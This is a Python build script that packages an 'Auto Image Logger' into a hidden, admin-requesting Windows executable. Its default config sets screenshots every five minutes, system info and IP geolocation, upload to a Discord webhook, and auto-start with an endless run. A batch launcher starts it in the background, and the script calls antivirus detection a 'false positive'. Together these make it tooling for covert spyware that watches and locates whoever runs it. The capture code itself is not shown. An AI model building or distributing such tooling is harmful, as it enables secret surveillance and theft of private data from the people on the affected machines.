#!/usr/bin/env python3
"""
Build script for creating Auto Image Logger executable - FIXED VERSION
"""

import os
import sys
import shutil
import json
import PyInstaller.__main__
import platform


def clean_build_dirs():
    """Remove previous build directories."""
    dirs_to_remove = ['build', 'dist', 'auto_image_logger.spec']
    for dir_name in dirs_to_remove:
        if os.path.exists(dir_name):
            try:
                if os.path.isdir(dir_name):
                    shutil.rmtree(dir_name)
                else:
                    os.remove(dir_name)
                print(f"🗑️  Removed: {dir_name}")
            except Exception as e:
                print(f"⚠️  Could not remove {dir_name}: {e}")


def check_dependencies():
    """Check if required packages are installed."""
    required_packages = ['pyinstaller', 'requests', 'pillow', 'psutil']
    missing = []

    for package in required_packages:
        try:
            __import__(package.replace('-', '_'))
        except ImportError:
            missing.append(package)

    if missing:
        print(f"❌ Missing packages: {', '.join(missing)}")
        print("Installing missing packages...")
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing)
        print("✅ Packages installed")

    return True


def create_launcher_bat():
    """Create launcher batch file for Windows."""
    bat_content = """@echo off
echo ========================================
echo    AUTO IMAGE LOGGER - WINDOWS LAUNCHER
echo ========================================
echo.
echo Starting Auto Image Logger...
echo This window will close when the logger starts.
echo.
echo Logs will be saved to:
echo   - auto_logger.log
echo   - auto_captures\\ (screenshots)
echo   - session_logs\\ (session data)
echo.
echo To stop the logger, close the console window.
echo.
timeout /t 3 /nobreak >nul

start /B AutoImageLogger.exe

echo.
echo Logger started in background!
echo You can now close this window.
echo.
pause
"""

    with open("start_logger.bat", "w") as f:
        f.write(bat_content)

    print("✅ Created launcher: start_logger.bat")


def create_config_if_missing():
    """Create default config if it doesn't exist."""
    if not os.path.exists("auto_config.json"):
        print("📝 Creating default configuration file...")

        default_config = {
            "webhook_url": "YOUR_DISCORD_WEBHOOK_URL_HERE",
            "capture_interval": 300,
            "image_quality": 85,
            "max_captures": 0,
            "save_locally": True,
            "local_save_path": "auto_captures",
            "compress_images": True,
            "max_image_size_mb": 8,
            "embed_color": 15158332,
            "include_timestamp": True,
            "include_system_info": True,
            "capture_location": True,
            "location_service": "ipapi",
            "location_timeout": 5,
            "start_delay": 10,
            "log_level": "INFO",
            "run_forever": True,
            "auto_start": True
        }

        with open("auto_config.json", "w") as f:
            json.dump(default_config, f, indent=4)

        print("⚠️  IMPORTANT: Please edit auto_config.json and set your Discord webhook URL!")
        return False
    return True


def build_executable():
    """Build the executable using PyInstaller."""
    print("🔨 Building executable...")

    # Get the correct path separator for the current platform
    # Windows uses ; Linux/Mac uses :
    path_sep = ";" if platform.system() == "Windows" else ":"

    # PyInstaller arguments - FIXED PATH SEPARATOR
    args = [
        'auto_image_logger.py',  # Your main script
        '--name=AutoImageLogger',  # Output name
        '--onefile',  # Single executable
        '--windowed',  # No console window (hidden)
        '--clean',  # Clean build
        f'--add-data=auto_config.json{path_sep}.',  # FIXED: Use correct separator
        '--noconfirm',  # Don't ask for confirmation
    ]

    # Add icon if exists
    if os.path.exists("icon.ico"):
        args.append('--icon=icon.ico')

    # Platform-specific optimizations
    if platform.system() == "Windows":
        args.extend([
            '--uac-admin',  # Request admin privileges if needed
        ])

    try:
        PyInstaller.__main__.run(args)
        print("✅ Executable built successfully!")

        # Copy config file to dist folder if it exists
        if os.path.exists("auto_config.json"):
            shutil.copy2("auto_config.json", "dist/auto_config.json")
            print("✅ Copied config to dist folder")

        return True
    except Exception as e:
        print(f"❌ Build failed: {e}")
        print("\n🛠️  Trying alternative build method...")
        return try_alternative_build()


def try_alternative_build():
    """Try alternative build method with spec file."""
    print("🛠️  Creating spec file for manual build...")

    # Create a spec file
    spec_content = f"""# -*- mode: python ; coding: utf-8 -*-
import sys
import os
from PyInstaller.utils.hooks import collect_all

# Get the correct path separator
path_sep = ';' if sys.platform == 'win32' else ':'

a = Analysis(
    ['auto_image_logger.py'],
    pathex=[],
    binaries=[],
    datas=[('auto_config.json', '.')],
    hiddenimports=[
        'requests',
        'PIL',
        'PIL._imaging',
        'PIL._imagingtk',
        'PIL._imagingft',
        'psutil',
        'logging',
        'json',
        'datetime',
        'io',
        'threading',
        'signal',
        'pathlib',
        'traceback',
    ],
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=1,
)

pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    [],
    exclude_binaries=True,
    name='AutoImageLogger',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon='icon.ico' if os.path.exists('icon.ico') else None,
)

coll = COLLECT(
    exe,
    a.binaries,
    a.zipfiles,
    a.datas,
    strip=False,
    upx=True,
    upx_exclude=[],
    name='AutoImageLogger',
)
"""

    with open("auto_image_logger.spec", "w") as f:
        f.write(spec_content)

    print("📄 Spec file created. Building with spec file...")

    try:
        PyInstaller.__main__.run(['auto_image_logger.spec', '--clean', '--noconfirm'])
        print("✅ Executable built successfully from spec file!")

        # Copy config file to dist folder
        if os.path.exists("auto_config.json"):
            shutil.copy2("auto_config.json", "dist/auto_config.json")
            print("✅ Copied config to dist folder")

        return True
    except Exception as e:
        print(f"❌ Spec file build also failed: {e}")
        return False


def main():
    """Main build function."""
    print("=" * 60)
    print("🔨 AUTO IMAGE LOGGER - EXE BUILDER (FIXED)")
    print("=" * 60)
    print()

    # Step 1: Check platform
    current_platform = platform.system()
    print(f"🌍 Detected platform: {current_platform}")
    print(f"📁 Current directory: {os.getcwd()}")
    print()

    # Step 2: Clean previous builds
    print("🧹 Cleaning previous builds...")
    clean_build_dirs()

    # Step 3: Check dependencies
    print("📦 Checking dependencies...")
    check_dependencies()

    # Step 4: Create config if missing
    print("⚙️  Checking configuration...")
    create_config_if_missing()

    # Step 5: Build executable
    print("🚀 Starting build process...")
    if build_executable():
        # Step 6: Create launcher
        print("🚀 Creating launcher script...")
        create_launcher_bat()

        # Step 7: Copy launcher to dist
        if os.path.exists("start_logger.bat"):
            shutil.copy2("start_logger.bat", "dist/start_logger.bat")

        # Step 8: Show success message
        print("\n" + "=" * 60)
        print("🎉 BUILD SUCCESSFUL!")
        print("=" * 60)
        print("\n📁 Your files are in the 'dist' folder:")
        print("   ├── AutoImageLogger.exe  (Main executable)")
        print("   ├── start_logger.bat     (Easy launcher)")
        print("   └── auto_config.json     (Configuration)")
        print()
        print("📋 Quick Start:")
        print("   1. Edit 'dist/auto_config.json' with your Discord webhook URL")
        print("   2. Run 'dist/start_logger.bat'")
        print("   3. Check 'auto_logger.log' for output")
        print()
        print("⚠️  IMPORTANT:")
        print("   • Anti-virus might flag the .exe (false positive)")
        print("   • Keep all files in the same folder")
        print("   • First run might take a few seconds")

        # Open dist folder on Windows
        if current_platform == "Windows":
            try:
                os.startfile("dist")
            except:
                pass
    else:
        print("\n❌ Build failed!")
        print("\n🔧 Manual Build Commands:")
        print("=" * 40)

        if current_platform == "Windows":
            print("For Windows Command Prompt:")
            print(
                'pyinstaller --onefile --windowed --clean --name AutoImageLogger --add-data "auto_config.json;." auto_image_logger.py')
            print()
            print("For Windows PowerShell:")
            print(
                'pyinstaller --onefile --windowed --clean --name AutoImageLogger --add-data "auto_config.json;." auto_image_logger.py')
        else:
            print("For Linux/Mac:")
            print(
                'pyinstaller --onefile --windowed --clean --name AutoImageLogger --add-data "auto_config.json:." auto_image_logger.py')


if __name__ == "__main__":
    main()
